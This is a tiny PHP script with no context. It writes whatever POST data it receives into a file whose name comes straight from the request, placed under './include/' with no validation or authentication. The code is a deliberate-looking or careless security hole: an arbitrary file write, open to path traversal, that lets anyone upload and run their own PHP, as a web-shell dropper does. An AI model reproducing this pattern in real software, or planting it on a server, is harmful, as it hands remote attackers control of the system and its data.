<?php 

$filename='./include/'.$_POST['filename'];
$fp2= fopen($filename,"w");
fwrite($fp2,$_POST['data']);
fclose($fp2);
 ?>